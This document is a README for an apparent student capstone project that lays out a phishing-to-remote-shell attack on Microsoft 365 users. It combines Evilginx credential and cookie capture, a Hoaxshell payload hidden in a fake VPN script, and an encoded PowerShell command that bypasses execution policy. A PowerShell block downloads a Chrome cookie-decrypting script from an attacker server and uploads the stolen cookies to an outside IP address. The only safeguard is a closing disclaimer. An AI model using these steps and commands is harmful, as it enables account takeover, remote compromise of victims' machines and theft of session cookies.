# Capstone Project

## Overview
The Capstone project is aimed at demonstrating a multi-stage attack scenario targeting Microsoft 365 environments. The attack involves utilizing [Evilginx](https://github.com/kgretzky/evilginx2) for phishing lure creation to obtain initial access by capturing the credentials and cookies of the targeted user. Afterward, [Hoaxshell](https://github.com/t3l3machus/hoaxshell) is used to obtain a payload that establishes remote shell access. To deliver this payload, a fake VPN script is created. To circumvent security measures like execution policy, the PowerShell script is converted into a single-line encoded PowerShell command and executed from a malicious .bat file.

## Components
1. **[Evilginx](https://github.com/kgretzky/evilginx2):** Used for creating phishing lure URLs to capture user credentials and cookies.
2. **[Hoaxshell](https://github.com/t3l3machus/hoaxshell):** Used to obtain a payload for establishing remote shell access.
3. **Fake VPN Script:** Created to deliver the payload, disguising it as a legitimate VPN script. Used to obtain malicious payload containing all of this.
4. **Encoded PowerShell Command:** Used to execute the payload from a malicious .bat file, bypassing execution policies.
5. **Cookie Decryptor:** Used to decrypt and extract all Chrome cookies.

## Usage
1. **[Evilginx](https://github.com/kgretzky/evilginx2) Setup:** Configure [Evilginx](https://github.com/kgretzky/evilginx2) to create phishing URLs targeting Microsoft 365 login pages.
2. **Phishing Campaign:** Launch a phishing campaign to lure targeted users into entering their credentials.
3. **Payload Generation:** Utilize [Hoaxshell](https://github.com/t3l3machus/hoaxshell) to generate a payload for establishing remote shell access.
4. **Encoding PowerShell Command:** Convert the PowerShell script into a single-line encoded PowerShell command.
5. **Execution:** Execute the encoded PowerShell command from the malicious .bat file to establish remote shell access.
6. **Cookie Decryptor:** Used to decrypt and extract all Chrome cookies.

## Installing the Python Script in HoaxShell
```
# Download Python installer
Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.9.7/python-3.9.7-amd64.exe" -OutFile "python-3.9.7-amd64.exe"

# Install Python silently
Start-Process -FilePath "python-3.9.7-amd64.exe" -ArgumentList "/quiet", "InstallAllUsers=1", "PrependPath=1" -NoNewWindow -Wait

# Clean up downloaded installer
Remove-Item "python-3.9.7-amd64.exe"


# Change Directory to pip3 location
cd “C:\Program Files\Python39\Scripts\”

# Install Required Packages
./pip3.exe install pycryptodome pypiwin32

# Pulling the Python Script from Simple Web Server (Python -m http.server 8080)
Invoke-WebRequest -Uri "http://X.X.X.X/cookiemonster.py" -OutFile "C:\Users\XXXXXXX\Documents\cookiemonster.py"

# Run the file (ensure the file is hosted within the directory of the Users Cookies you want)
& “C:\Program Files\Python39\python.exe” “C:\Users\XXXXXXXXXXXXXXXXXXX\Documents\cookiemonster.py”

# Extraction: Upload the file to a Simple PHP Web Server
(New-Object System.Net.WebClient).UploadFile("http://35.203.99.71/upload.php", "C:\Users\champuser\Desktop\output.txt")
```

## Disclaimer
This project is intended for educational and research purposes only. Unauthorized use of this project for malicious purposes is strictly prohibited. The authors of this project are not responsible for any misuse or damage caused by its implementation.
